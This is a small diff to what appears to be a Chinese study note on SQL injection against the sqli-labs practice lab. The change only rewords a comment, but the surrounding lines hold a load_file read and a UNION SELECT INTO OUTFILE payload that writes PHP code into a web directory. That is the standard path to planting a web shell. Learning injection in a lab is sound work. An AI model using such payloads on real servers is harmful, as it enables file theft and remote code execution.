@@ -49,7 +49,7 @@ sql注入：
         读：
             select load_file("e:\\flag.txt")
         写：
-            把 '<?php phpinfo();?>' 写入了 1.php
+            把 '<?php phpinfo();?>' 写入 1.php
             ?id=-1')) union select 1, '<?php phpinfo();?>', 3 into outfile 'D:\\phpstudy\\phpstudy\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\1.php' --+
 
 
